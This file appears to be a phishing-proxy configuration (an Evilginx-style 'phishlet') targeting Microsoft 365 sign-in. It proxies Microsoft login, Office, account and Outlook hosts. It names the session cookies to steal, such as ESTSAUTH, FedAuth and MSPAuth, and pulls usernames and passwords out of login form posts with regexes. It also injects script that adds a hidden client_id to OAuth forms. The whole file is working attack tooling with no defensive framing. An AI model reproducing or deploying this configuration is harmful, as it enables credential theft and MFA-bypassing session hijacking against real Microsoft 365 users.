name: 'o365'
author: '@fazar'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: false, is_landing: false}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'office.com', session: true, is_landing: false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'action="/common/oauth2/authorize"', replace: 'action="/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca"', mimes: ['text/html']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'action="/common/oauth2/v2.0/authorize"', replace: 'action="/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca"', mimes: ['text/html']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT']
  - domain: 'login.microsoftonline.com'
    keys: ['SignInStateCookie', 'buid', 'x-ms-gateway-slice']
  - domain: '.office.com'
    keys: ['rtFa', 'FedAuth']
  - domain: '.microsoft.com'
    keys: ['MSPOK', 'MSPRequ', 'MSFPC']
  - domain: '.live.com'
    keys: ['MSPAuth', 'MSNRPSAuth', 'MSPProf']

auth_urls:
  - '/common/oauth2/v2.0/authorize'
  - '/common/oauth2/authorize'
  - '/common/SAS/ProcessAuth'
  - '/kmsi'
  - '/adfs/ls/idpinitiatedsignon.aspx'
  - '/portal'
  - '/mail'
  - '/teams'

credentials:
  username:
    key: '(login|UserName|loginfmt)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|pwd)'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize'

js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/common/login', '/common/oauth2/authorize', '/common/oauth2/v2.0/authorize']
    script: |
      // Add client_id to forms
      document.addEventListener('DOMContentLoaded', function() {
        var forms = document.getElementsByTagName('form');
        for (var i = 0; i < forms.length; i++) {
          var form = forms[i];
          if (form.action.includes('oauth2')) {
            var clientInput = document.createElement('input');
            clientInput.type = 'hidden';
            clientInput.name = 'client_id';
            clientInput.value = '4765445b-32c6-49b0-83e6-1d93765276ca';
            form.appendChild(clientInput);
          }
        }
      });
